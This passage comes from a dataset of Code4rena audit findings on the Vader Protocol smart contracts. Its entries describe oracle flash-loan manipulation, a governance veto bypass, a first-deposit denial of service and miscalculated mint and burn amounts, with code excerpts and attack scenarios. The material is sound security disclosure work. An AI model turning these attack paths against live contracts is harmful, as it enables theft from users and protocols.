equivalent to value of all LP tokens so for more information see this post: <https://blog.alphafinance.io/fair-lp-token-pricing/>\n\n#### Recommended Mitigation Steps\n\nCalculate fair reserves using the pool invariant and the fair prices of the two assets.\n\nThe above link contains a mitigates for Uniswap, a similar calculation would have to be performed which is specific for the Vader invariant.\n\n**[SamSteinGG (Vader) disputed and commented](https://github.com/code-423n4/2021-12-vader-findings/issues/40#issuecomment-1001506397):**\n > The evaluation of liquidity for a particular pair is performed based on the reserves of the previous block rendering a flash loan attack impossible. Can the  warden clarify how he is expecting this to be exploited?\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in an oracle that can lead to a loss of resilience in pricing for a single pair. The vulnerability is caused by an attacker manipulating the reserves of the underlying pair with a flash loan attack. This attack will make a pool appear with an arbitrarily large currentLiquidityEvaluation, which will result in all other pairs contributing negligibly to the final result of the oracle. While this doesn't lead to a loss of funds, it can force the oracle to only use a malfunctioning or deprecated Chainlink price feed for the asset in any pool. The recommended mitigation step is to calculate fair reserves using the pool invariant and the fair prices of the two assets. A similar calculation should be performed which is specific for the Vader invariant.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/40",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1252",
      "title": "[M-05] Users can lock themselves out of being able to convert VETH, becoming stuck with the deprecated asset",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\nI've put this as a medium issue as we're leaking value as users are stuck with assets which are likely to be worth much less as they are deprecated. It could also be low as it's not exploitable by outside parties and the loss isn't taken by the protocol but the user.\n\n#### Impact\n\nPotential for users to lose the right to convert VETH to VADER, being stuck with a deprecated token.\n\n#### Proof of Concept\n\nShould a user have a zero allowance of VETH on the converter, no VETH will be taken and no VADER will be paid out as L147 will set the amount to zero.\n\n<https://github.com/code-423n4/2021-12-vader/blob/28d3405447f0c3353964ca755a42562840d151c5/contracts/tokens/converter/Converter.sol#L145-L150>\n\nThere is a `minVader` check on L153 to enforce a minimum output of VADER but should this be improperly set the transaction would succeed with the user receiving much less VADER than they expect.\n\nCrucially, the merkle proof that was used in this transaction will be marked as invalid so the user will not be able to try again once they have set the proper allowance. Someone can then lose the opportunity to convert their VETH and are left with a worthless deprecated token if they are inattentive.\n\nIt seems like this is trying to handle the case where a user doesn't have the full amount of VETH as they are entitled to convert (by setting their allowance equal to their balance?). This is a pretty suboptimal way to go about this as it's extremely implicit so users are liable to make mistakes.\n\nI'd recommend decoupling the merkle proof from conversion of VETH to VADER:\n\n1.  Change the merkle proof to set an `amountEligibleToConvert` value in storage for each user (which would be initially set to `amount`).\n2.  Allow a user to then convert VETH to VADER up to their `amountEligibleToConvert` value, subtracting the amount converted from this each time.\n\nFor gas efficiency we can use a sentinel value here to mark a user which has claimed their full quota already distinctly from someone who hasn't provided a merkle proof yet (to avoid having to track this separately in another storage slot)\n\nThese two steps could be chained in a single transaction to give a similar UX as currently but would also allow users to recover in the case of partial conversions.\n\n#### Recommended Mitigation Steps\n\nAs above. I'd caution against just stating \"The frontend will handle this correctly so this isn't an issue\", there will be users who interact with the contract manually so it's important to make the interface safe where possible.\n\n**[0xstormtrooper (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/97)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a blockchain protocol, which could lead to users potentially losing the right to convert VETH to VADER, being stuck with a deprecated token. The issue is not exploitable by outside parties and the loss is not taken by the protocol but the user. The proof of concept explains that if a user has a zero allowance of VETH on the converter, no VETH will be taken and no VADER will be paid out. Additionally, the merkle proof used in the transaction will be marked as invalid, so the user cannot try again. The recommended mitigation steps are to decouple the merkle proof from conversion of VETH to VADER, and to set an 'amountEligibleToConvert' value in storage for each user, allowing them to convert VETH to VADER up to their 'amountEligibleToConvert' value, subtracting the amount converted from this each time. It is cautioned against simply stating that the frontend will handle this correctly, as some users interact with the contract manually.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/97",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1251",
      "title": "[M-04] VaderReserve.reimburseImpermanentLoss improperly converts USDV to VADER",
      "impact": "MEDIUM",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n## Impact\n\nIL isn't properly converted from being in terms of USDV to VADER, resulting in reserve paying out incorrect amount.\n\n## Proof of Concept\n\n`VaderReserve.reimburseImpermanentLoss` receives an `amount` in terms of USDV and converts this to an amount of VADER to send to `recipient`.\n\nHowever as shown in the link if there is a previous price stored for USDV, the amount of VADER tokens to be sent to the `recipient` is `amount / usdvPrice`.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/reserve/VaderReserve.sol#L84-L110\n\n`usdvPrice` is the total USD value of foreign assets divided by the total amount of USDV in a number of pairs. It's then some measure of the inverse of the price of USDV in USD, nothing to do with converting into VADER.\n\nThe reserve will then improperly calculate the amount of VADER to pay out once there is a single reading of the USDV price.\n\n## Recommended Mitigation Steps\n\nIt looks like both branches of this if statement are supposed to be run, i.e. convert from USDV to USD and then to VADER but I can't be sure. Care should be taken so that the calculation being performed is the expected one.",
      "summary": "\nThis bug report is about a flaw in the VaderReserve.reimburseImpermanentLoss function which is part of the code-423n4/2021-12-vader repository. The flaw causes the reserve to pay out an incorrect amount of VADER tokens when converting from USDV to VADER. The problem is caused by the code incorrectly calculating the amount of VADER to pay out when there is a single reading of the USDV price. The recommended mitigation step is to check the calculation being performed so that it is the expected one.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/7",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1250",
      "title": "[M-03] No way to remove GasThrottle from VaderPool after deployment",
      "impact": "MEDIUM",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n## Impact\n\nPotential DOS on swaps on `VaderPool`\n\n## Proof of Concept\n\nBasePool makes use of a `validateGas` modifier on swaps which checks that the user's gas price is below the value returned by `_FAST_GAS_ORACLE`.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/pool/BasePool.sol#L292\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/utils/GasThrottle.sol#L8-L22\n\nShould  `_FAST_GAS_ORACLE` be compromised to always return zero then all swaps will fail. There is no way to recover from this scenario.\n\n## Recommended Mitigation Steps\n\nEither remove GasThrottle.sol entirely or allow governance to turn it off as is done in VaderPoolV2.sol",
      "summary": "\nThis bug report is about a potential Denial of Service (DOS) attack on the VaderPool platform. The attack is enabled by a modifier called `validateGas` in the BasePool smart contract, which checks that the user's gas price is below the value returned by `_FAST_GAS_ORACLE`. If `_FAST_GAS_ORACLE` is compromised to always return zero, all swaps will fail, and there is no way to recover from this scenario. The recommended mitigation steps are to either remove GasThrottle.sol entirely, or allow governance to turn it off as is done in VaderPoolV2.sol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/52",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1249",
      "title": "[M-02] Adding pair of the same foreignAsset would replace oracle of earlier entry",
      "impact": "MEDIUM",
      "content": "## Handle\n\ngzeon\n\n\n## Vulnerability details\n\n## Impact\nOracles are mapped to the `foreignAsset` but not to the specific pair. Pairs with the same `foreignAsset` (e.g. UniswapV2 and Sushi) will be forced to use the same oracle. Generally this should be the expected behavior but there are also possibility that while adding a new pair changed the oracle of an older pair unexpectedly.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-12-vader/blob/9fb7f206eaff1863aeeb8f997e0f21ea74e78b49/contracts/lbt/LiquidityBasedTWAP.sol#L271\n```\n        oracles[foreignAsset] = oracle;\n```\n\n## Recommended Mitigation Steps\nBind the oracle to pair instead",
      "summary": "\nThis bug report is about how oracles are mapped to the foreignAsset but not to the specific pair. This could cause issues when adding a new pair, as it could unexpectedly change the oracle of an older pair. As a proof of concept, a link to a GitHub repository has been provided. The recommended mitigation step is to bind the oracle to the pair instead.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/160",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1247",
      "title": "[H-14] Denial of service",
      "impact": "HIGH",
      "content": "_Submitted by danb_\n\n<https://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L334>\non the first deposit, the total liquidity is set to `nativeDeposit`.\nthis might be a very low number compared to `foreignDeposit`.\nIt can cause a denial of service of the pair.\n\n#### Impact\n\nA pair can enter a denial of service state.\n\n#### Proof of Concept\n\nconsider the following scenario:\nthe owner of the pool calls `setFungibleTokenSupport` for a new token, for example weth.\na malicious actor calls `mintFungible`,  with `nativeDeposit == 1` and `foreignDeposit == 10 ether`.\n`totalLiquidityUnits` will be 1.\nthe pool can be arbitraged, even by the attacker, but `totalLiquidityUnits` will still be 1.\nthis means that 1 liquidity token is equal to all of the pool reserves, which is a lot of money.\nIt will cause a very high rounding error for anyone trying to mint liquidity.\nthen, anyone who will try to mint liquidity will either:\n\n1.  fail, because they can't mint 0 liquidity if their amount is too small.\n2.  get less liquidity tokens than they should, because there is a very high rounding error, and its against new liquidity providers.\n\nThe rounding error losses will increase the pool reserves, which will increase value of liquidity tokens, so the hacker can even profit from this.\n\nafter this is realised, no one will want to provide liquidity, and since the pair cannot be removed or replaced, it will cause denial of service for that token forever.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/98)**\n\n\n\n***\n\n \n",
      "summary": "\nA vulnerability has been discovered in the VaderPoolV2.sol contract which could lead to a denial of service state for a pair. The vulnerability is caused by setting the total liquidity to the nativeDeposit when a new deposit is made, which can be a very low number compared to the foreignDeposit. This can lead to a high rounding error when someone tries to mint liquidity, either causing them to fail or receive less liquidity tokens than they should. As the rounding error losses increase the pool reserves, the hacker can even profit from this exploit. This vulnerability can lead to an irrecoverable denial of service state for the pair as no one will want to provide liquidity and the pair cannot be removed or replaced.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/98",
      "tags": [],
      "finders": [
        "danb"
      ]
    },
    {
      "id": "1246",
      "title": "[H-13] Council veto protection does not work",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\nCouncil can veto proposals to remove them to remain in power.\n\n#### Proof of Concept\n\nThe Vader governance contract has the concept of a \"council\" which can unilaterally accept or reject a proposal. To prevent a malicious council preventing itself from being replaced by the token holders, the veto function checks the calldata for any proposal action directed at `GovernorAlpha` to see if it matches the `changeCouncil` function selector.\n\nNote this is done by reading from the `proposal.calldatas` array.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L568-L603>\n\nIf we look at the structure of a proposal however we can see that the function selector is held (in the form of the signature) in the `signatures` array rather than being included in the calldata. The `calldata` array then holds just the function arguments for the call rather than specifying which function to call.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L71-L72>\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L356-L362>\n\nIndeed if we look at the `TimeLock` contract we see that the signature is hashed to calculate the function selector and is prepended onto the calldata.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/Timelock.sol#L292-L299>\n\nLooking at the function signature of the `changeCouncil` we can see that the value that the `veto` function will check against `this.changeCouncil.signature` will be the first 4 bytes of an abi encoded address and so will always be zero no matter what function is being called.\n\n<https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/governance/GovernorAlpha.sol#L623>\n\nHigh risk as this issue gives the council absolute control over the DAO such that they cannot be removed.\n\n#### Recommended Mitigation Steps\n\nHash the function signatures to calculate function selectors and then check those rather than the calldata.\n\nThis is something that should be picked up by a test suite however, I'd recommend writing tests to ensure that protections you add to the code have any affect and more broadly check that the code behaves as expected.\n\n**[SamSteinGG (Vader) acknowledged](https://github.com/code-423n4/2021-12-vader-findings/issues/44)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vader governance contract. The bug allows the council to veto any proposal to remove them from power, thus giving them absolute control over the DAO. This is considered a high risk issue. To mitigate this issue, the function signatures should be hashed to calculate the function selectors and then checked rather than the calldata. Additionally, a test suite should be written to ensure that the code behaves as expected and that protections added to the code have any affect.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/44",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1245",
      "title": "[H-12] Using single total native reserve variable for synth and non-synth reserves of VaderPoolV2 can lead to losses for synth holders",
      "impact": "HIGH",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nUsers that mint synths do provide native assets, increasing native reserve pool, but do not get any liquidity shares issued.\nIn the same time, an exit of non-synth liquidity provider yields releasing a proportion of all current reserves to him.\n\nWhenever an exit of non-synth LP is substantial enough, the system will have much less native asset regarding the cumulative deposit of synth holders. That is, when a LP entered he provided a share of current reserves, both native and foreign, and got the corresponding liquidity shares in return. Suppose then big enough amounts of synths were minted, providing correspondingly big enough amount of native assets. If the LP now wants to exit, he will obtain a part of total native assets, including a part of the amount that was provided by synth minter. If the exit is big enough there will be substantially less native assets left to reimburse the synth minter than he initially provided. This is not reversible: the synth minters lost their native assets to LP that exited.\n\n## Proof of Concept\n\nThere are three types of mint/burn: NFT, fungible and synths. First two get LP shares, the latter gets synths. Whenever NFT or fungible LP exits, it gets a proportion of combined reserves. That is, some of native reserves were deposited by synth minters, but it is not accounted anyhow, only one total reserve number per asset is used.\n\nSuppose the following scenario, Alice wants to provide liquidity, while Bob wants to mint synths:\n1. Alice deposits both sides to a pool, 100 USDV and 100 foreign.\n2. Bob deposit 100 USDV and mints some foreign Synth.\n3. LP withdraws 95% of her liquidity shares. As she owns the pool liquidity, she gets 95% of USDV and foreign total reserves, 190 USDV and 95 foreign. Alice received almost all of her and Bob's USDV.\n4. If Bob burn his synth and withdraw, he will get a tiny fraction of USDV he deposited (calculated by VaderMath.calculateSwap, we use its terms):\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex/math/VaderMath.sol#L98\nx = 100, X = 0.05 * 200 = 10, Y = 0.05 * 100 = 5.\nSwap outcome, how much USDV will Bob get, is x * Y * X / (x + X) ^ 2 = 100 * 5 * 10 / (110^2) = 0.4 (rounded).\n\nThe issue is that synth provided and LP provided USDV aren't accounted separately, total reserves number if used everywhere instead:\n\nSynth minters provide native asset, say USDV, to the system:\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187\n\nSynth minters get synths and no LP shares, while to account for their deposit, the total USDV balance is increased:\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L187\n\nWhen LP enters, it gets liquidity shares proportionally to current reserves (NFT mint, notice the reserveNative, which is BasePoolV2's pair.reserveNative, total amount of native asset in the Pool):\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L497\n\nWhen LP exits, it gets a proportion of current reserves back (NFT burn):\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/BasePoolV2.sol#L223\n\nThe same happens when fungible LP mints (same reserveNative):\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L336\nAnd burns:\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/dex-v2/pool/VaderPoolV2.sol#L401\n\n## Recommended Mitigation Steps\n\nAccount for LP provided liquidity separately from total amount variables, i.e. use only LP provided native reserves variables in LP shares mint and burn calculations.\nThat should suffice as total amount of native assets is still to be used elsewhere, whenever the whole pool is concerned, for example, in rescue function, swap calculations and so forth.",
      "summary": "\nThis bug report is about the issue that users who mint synths do not get any liquidity shares issued. When a non-synth liquidity provider exits, they receive a proportion of all current reserves, including a part of the amount provided by synth minters. This is not reversible, resulting in the synth minters losing their native assets to the LP that exited. The proof of concept is a scenario where Alice deposits both sides to a pool, 100 USDV and 100 foreign, while Bob deposits 100 USDV and mints some foreign Synth. When the LP withdraws 95% of her liquidity shares, Alice receives almost all of her and Bob's USDV. When Bob burns his synth and withdraws, he will get a tiny fraction of USDV he deposited. The issue is that synth provided and LP provided USDV aren't accounted separately, total reserves number is used everywhere instead. The recommended mitigation step is to account for LP provided liquidity separately from total amount variables, by using only LP provided native reserves variables in LP shares mint and burn calculations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/179",
      "tags": [],
      "finders": [
        "hyh",
        "certora"
      ]
    },
    {
      "id": "1244",
      "title": "[H-11] totalLiquidityWeight Is Updated When Adding New Token Pairs Which Skews Price Data For getVaderPrice and getUSDVPrice",
      "impact": "HIGH",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `_addVaderPair` function is called by the `onlyOwner` role. The relevant data in the `twapData` mapping is set by querying the respective liquidity pool and Chainlink oracle. `totalLiquidityWeight` for the `VADER` path is also incremented by the `pairLiquidityEvaluation` amount (calculated within `_addVaderPair`). If a user then calls `syncVaderPrice`, the recently updated `totalLiquidityWeight` will be taken into consideration when iterating through all token pairs eligible for price updates to calculate the liquidity weight for each token pair. This data is stored in `pastTotalLiquidityWeight` and `pastLiquidityWeights` respectively.\n\nAs a result, newly added token pairs will increase `pastTotalLiquidityWeight` while leaving `pastLiquidityWeights` underrepresented. This only occurs if `syncVaderPrice` is called before the update period for the new token has not been passed.\n\nThis issue also affects how the price for `USDV` is synced.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L299\n```\nfunction _addVaderPair(\n    IUniswapV2Pair pair,\n    IAggregatorV3 oracle,\n    uint256 updatePeriod\n) internal {\n    require(\n        updatePeriod != 0,\n        \"LBTWAP::addVaderPair: Incorrect Update Period\"\n    );\n\n    require(oracle.decimals() == 8, \"LBTWAP::addVaderPair: Non-USD Oracle\");\n\n    ExchangePair storage pairData = twapData[address(pair)];\n\n    bool isFirst = pair.token0() == vader;\n\n    (address nativeAsset, address foreignAsset) = isFirst\n        ? (pair.token0(), pair.token1())\n        : (pair.token1(), pair.token0());\n\n    oracles[foreignAsset] = oracle;\n\n    require(nativeAsset == vader, \"LBTWAP::addVaderPair: Unsupported Pair\");\n\n    pairData.foreignAsset = foreignAsset;\n    pairData.foreignUnit = uint96(\n        10**uint256(IERC20Metadata(foreignAsset).decimals())\n    );\n\n    pairData.updatePeriod = updatePeriod;\n    pairData.lastMeasurement = block.timestamp;\n\n    pairData.nativeTokenPriceCumulative = isFirst\n        ? pair.price0CumulativeLast()\n        : pair.price1CumulativeLast();\n\n    (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();\n\n    (uint256 reserveNative, uint256 reserveForeign) = isFirst\n        ? (reserve0, reserve1)\n        : (reserve1, reserve0);\n\n    uint256 pairLiquidityEvaluation = (reserveNative *\n        previousPrices[uint256(Paths.VADER)]) +\n        (reserveForeign * getChainlinkPrice(foreignAsset));\n\n    pairData.pastLiquidityEvaluation = pairLiquidityEvaluation;\n\n    totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;\n\n    vaderPairs.push(pair);\n\n    if (maxUpdateWindow < updatePeriod) maxUpdateWindow = updatePeriod;\n}\n```\n\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L113-L148\n```\nfunction syncVaderPrice()\n    public\n    override\n    returns (\n        uint256[] memory pastLiquidityWeights,\n        uint256 pastTotalLiquidityWeight\n    )\n{\n    uint256 _totalLiquidityWeight;\n    uint256 totalPairs = vaderPairs.length;\n    pastLiquidityWeights = new uint256[](totalPairs);\n    pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];\n\n    for (uint256 i; i < totalPairs; ++i) {\n        IUniswapV2Pair pair = vaderPairs[i];\n        ExchangePair storage pairData = twapData[address(pair)];\n        uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;\n\n        if (timeElapsed < pairData.updatePeriod) continue;\n\n        uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;\n        uint256 currentLiquidityEvaluation = _updateVaderPrice(\n            pair,\n            pairData,\n            timeElapsed\n        );\n\n        pastLiquidityWeights[i] = pastLiquidityEvaluation;\n\n        pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;\n\n        _totalLiquidityWeight += currentLiquidityEvaluation;\n    }\n\n    totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight;\n}\n```\n\nAs shown above, `pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)]` loads in the total liquidity weight which is updated when `_addVaderPair` is called. However, `pastLiquidityWeights` is calculated by iterating through each token pair that is eligible to be updated.\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider removing the line `totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;` in `_addVaderPair` so that newly added tokens do not impact upcoming queries for `VADER/USDV` price data. This should ensure `syncVaderPrice` and `syncUSDVPrice` cannot be manipulated when adding new tokens.",
      "summary": "\nA bug has been reported in the `_addVaderPair` function of the LiquidityBasedTWAP.sol contract. This function is called by the `onlyOwner` role and sets relevant data in the `twapData` mapping by querying the respective liquidity pool and Chainlink oracle. The bug occurs when a user calls `syncVaderPrice` before the update period for the new token has not been passed. This causes the `pastTotalLiquidityWeight` to increase while leaving `pastLiquidityWeights` underrepresented, which affects how the price for `USDV` is synced.\n\nThe bug has been identified through manual code review. To mitigate the issue, it is recommended to remove the line `totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;` in `_addVaderPair` so that newly added tokens do not impact upcoming queries for `VADER/USDV` price data. This should ensure `syncVaderPrice` and `syncUSDVPrice` cannot be manipulated when adding new tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/105",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1243",
      "title": "[H-10] previousPrices Is Never Updated Upon Syncing Token Price",
      "impact": "HIGH",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `LiquidityBasedTWAP` contract attempts to accurately track the price of `VADER` and `USDV` while still being resistant to flash loan manipulation and short-term volatility. The `previousPrices` array is meant to track the last queried price for the two available paths, namely `VADER` and `USDV`. \n\nThe `setupVader` function configures the `VADER` token by setting `previousPrices` and adding a token pair. However, `syncVaderPrice` does not update `previousPrices` after syncing, causing `currentLiquidityEvaluation` to be dependent on the initial price for `VADER`. As a result, liquidity weightings do not accurately reflect the current and most up to date price for `VADER`.\n\nThis same issue also affects how `USDV` calculates `currentLiquidityEvaluation`.\n\nThis issue is of high risk and heavily impacts the accuracy of the TWAP implementation as the set price for `VADER/USDV` diverges from current market prices. For example, as the Chainlink oracle price and initial price for `VADER` diverge, `currentLiquidityEvaluation` will begin to favour either on-chain or off-chain price data depending on which price result is greater. The following calculation for `currentLiquidityEvaluation` outlines this behaviour.\n\n```\ncurrentLiquidityEvaluation =\n    (reserveNative * previousPrices[uint256(Paths.VADER)]) +\n    (reserveForeign * getChainlinkPrice(pairData.foreignAsset));\n```\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L150-L189\n```\nfunction _updateVaderPrice(\n    IUniswapV2Pair pair,\n    ExchangePair storage pairData,\n    uint256 timeElapsed\n) internal returns (uint256 currentLiquidityEvaluation) {\n    bool isFirst = pair.token0() == vader;\n\n    (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();\n\n    (uint256 reserveNative, uint256 reserveForeign) = isFirst\n        ? (reserve0, reserve1)\n        : (reserve1, reserve0);\n\n    (\n        uint256 price0Cumulative,\n        uint256 price1Cumulative,\n        uint256 currentMeasurement\n    ) = UniswapV2OracleLibrary.currentCumulativePrices(address(pair));\n\n    uint256 nativeTokenPriceCumulative = isFirst\n        ? price0Cumulative\n        : price1Cumulative;\n\n    unchecked {\n        pairData.nativeTokenPriceAverage = FixedPoint.uq112x112(\n            uint224(\n                (nativeTokenPriceCumulative -\n                    pairData.nativeTokenPriceCumulative) / timeElapsed\n            )\n        );\n    }\n\n    pairData.nativeTokenPriceCumulative = nativeTokenPriceCumulative;\n\n    pairData.lastMeasurement = currentMeasurement;\n\n    currentLiquidityEvaluation =\n        (reserveNative * previousPrices[uint256(Paths.VADER)]) +\n        (reserveForeign * getChainlinkPrice(pairData.foreignAsset));\n}\n```\n\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L221-L235\n```\nfunction setupVader(\n    IUniswapV2Pair pair,\n    IAggregatorV3 oracle,\n    uint256 updatePeriod,\n    uint256 vaderPrice\n) external onlyOwner {\n    require(\n        previousPrices[uint256(Paths.VADER)] == 0,\n        \"LBTWAP::setupVader: Already Initialized\"\n    );\n\n    previousPrices[uint256(Paths.VADER)] = vaderPrice;\n\n    _addVaderPair(pair, oracle, updatePeriod);\n}\n```\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider updating `previousPrices[uint256(Paths.VADER)]` and `previousPrices[uint256(Paths.USDV)]` after syncing the respective prices for the two tokens. This will ensure the most up to date price is used when evaluating liquidity for all available token pairs.",
      "summary": "\nThis bug report is about a vulnerability in the `LiquidityBasedTWAP` contract which attempts to accurately track the prices of `VADER` and `USDV`. The `previousPrices` array is meant to track the last queried price for the two available paths, however, `syncVaderPrice` does not update `previousPrices` after syncing, causing `currentLiquidityEvaluation` to be dependent on the initial price for `VADER`. As a result, liquidity weightings do not accurately reflect the current and most up to date price for `VADER`. This same issue also affects how `USDV` calculates `currentLiquidityEvaluation`.\n\nThis issue is of high risk and heavily impacts the accuracy of the TWAP implementation as the set price for `VADER/USDV` diverges from current market prices. The proof of concept for this bug was done manually using code review.\n\nThe recommended mitigation steps for this issue include updating `previousPrices[uint256(Paths.VADER)]` and `previousPrices[uint256(Paths.USDV)]` after syncing the respective prices for the two tokens. This will ensure the most up to date price is used when evaluating liquidity for all available token pairs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/103",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1242",
      "title": "[H-09] USDV.sol Mint and Burn Amounts Are Incorrect",
      "impact": "HIGH",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `USDV.mint` function queries the price of `Vader` from the `LiquidityBasedTwap` contract. The calculation to determine `uAmount` in `mint` is actually performed incorrectly. `uAmount = (vPrice * vAmount) / 1e18;` will return the `USD` amount for the provided `Vader` as `vPrice` is denominated in `USD/Vader`. This `uAmount` is subsequently used when minting tokens for the user (locked for a period of time) and fee to the contract owner. \n\nThis same issue also applies to how `vAmount = (uPrice * uAmount) / 1e18;` is calculated in `USDV.burn`.\n\nThis is a severe issue, as the `mint` and `burn` functions will always use an incorrect amount of tokens, leading to certain loss by either the protocol (if the user profits) or the user (if the user does not profit).\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L66-L98\n```\nfunction mint(uint256 vAmount)\n    external\n    onlyWhenNotLocked\n    returns (uint256 uAmount)\n{\n    uint256 vPrice = lbt.getVaderPrice();\n\n    vader.transferFrom(msg.sender, address(this), 